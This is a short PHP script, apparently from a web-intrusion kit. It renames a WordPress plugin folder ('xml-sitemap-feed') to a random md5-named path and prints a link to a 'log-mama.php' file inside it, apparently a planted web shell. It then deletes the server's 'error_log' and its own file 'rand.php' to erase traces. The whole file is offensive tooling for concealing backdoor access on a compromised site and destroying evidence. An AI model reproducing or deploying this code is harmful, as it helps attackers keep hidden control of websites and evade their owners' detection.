<?php
$filedir = "../";
$str=rand();
$KONTOL1 = "xml-sitemap-feed";
$KONTOL2 = md5($str);
$oldname = $filedir.$KONTOL1;
$newname = $filedir.$KONTOL2;


if (rename($oldname, $newname)) {
	$message = sprintf(
		'The file %s was renamed to %s/n.txt successfully!',
		$oldname,
		$newname
	);
} else {
	$message = sprintf(
		'There was an error renaming file %s',
		$oldname
	);
}
echo "<a href='".$newname."/log-mama.php'>successfully</a>";
unlink('error_log');
unlink('rand.php');